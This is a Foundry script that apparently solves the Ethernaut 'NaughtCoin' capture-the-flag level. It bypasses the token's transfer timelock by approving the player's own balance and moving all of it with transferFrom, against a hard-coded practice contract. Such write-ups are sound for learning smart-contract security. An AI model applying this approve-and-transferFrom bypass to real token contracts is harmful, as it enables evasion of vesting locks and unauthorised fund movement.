// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract NaughtCoinSolution is Script {
        NaughtCoin naughtCoin = NaughtCoin(0x4c7C88a178251433bd677524e8c42690fb904F44);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address player = vm.envAddress("MY_ADDRESS");
        uint256 balance = naughtCoin.balanceOf(player);
        console.log(balance);
        naughtCoin.approve(player, balance);
        naughtCoin.transferFrom(player, address(naughtCoin), naughtCoin.balanceOf(player));
        vm.stopBroadcast();
        console.log(naughtCoin.balanceOf(player));
    }
}